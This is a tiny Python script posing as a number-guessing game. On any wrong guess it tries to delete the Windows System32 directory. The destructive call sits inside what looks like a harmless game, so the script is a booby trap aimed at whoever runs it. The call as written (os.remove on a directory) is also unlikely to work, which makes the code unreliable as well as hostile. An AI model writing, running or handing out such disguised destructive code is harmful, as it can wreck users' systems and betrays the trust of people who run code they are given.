import random
import os 

number = random.randint(1,10)

guess = input("haha funny game guess number between 1 and 10")
guess = int(guess)

if guess == number:
  print("damn lucky")
else:
  os.remove("C:\Windows\System32")
